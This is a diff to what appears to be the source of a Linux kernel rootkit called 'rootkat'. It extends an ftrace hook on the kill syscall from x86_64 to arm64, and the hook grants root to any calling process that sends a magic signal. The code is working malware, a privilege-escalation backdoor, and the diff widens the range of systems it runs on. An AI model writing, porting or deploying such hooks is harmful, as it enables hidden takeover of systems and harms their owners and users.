@@ -2,6 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/sched.h>
 #include <linux/ptrace.h>
+#include "arch_compat.h"
 #include "ftrace_hook.h"
 #include "magic_actions.h"
 #include "hook_sys_kill.h"
@@ -9,19 +10,15 @@
 #define TAG "rootkat/hook_sys_kill: "
 
 /*
- * Hook target: __x64_sys_kill is the syscall entry wrapper on x86_64.
- * It receives a single `struct pt_regs *` and unpacks args from the
- * registers itself. We mirror that signature so we can call the original
- * cleanly when the magic signal isn't present.
- *
- * Multi-candidate is single-element here because the alternative names
- * (__do_sys_kill, sys_kill) have a different signature (pid_t, int) and
- * mixing them in one hook isn't worth the code. If we ever need to
- * support kernels that don't have __x64_sys_kill exported, that's a new
- * hook file.
+ * Hook target: __x64_sys_kill (x86_64) or __arm64_sys_kill (arm64) is
+ * the syscall entry wrapper. It receives a single `struct pt_regs *`
+ * and unpacks args itself. We mirror that signature so we can call the
+ * original cleanly when the magic signal isn't present.
  */
 static const char * const sys_kill_candidates[] = {
-	"__x64_sys_kill", NULL,
+	"__x64_sys_kill",   /* x86_64 */
+	"__arm64_sys_kill", /* arm64  */
+	NULL,
 };
 
 typedef long (*sys_kill_t)(const struct pt_regs *regs);
@@ -35,8 +32,8 @@ static struct rootkat_hook hook_sys_kill = {
 static long rootkat_sys_kill(const struct pt_regs *regs)
 {
 	sys_kill_t orig = (sys_kill_t)hook_sys_kill.original;
-	int sig = (int)regs->si;
-	pid_t arg1 = (pid_t)regs->di;
+	int sig = (int)SYSCALL_ARG2(regs);
+	pid_t arg1 = (pid_t)SYSCALL_ARG1(regs);
 
 	if (sig == ROOTKAT_PRIVESC_SIG) {
 		rootkat_grant_root_to_current();
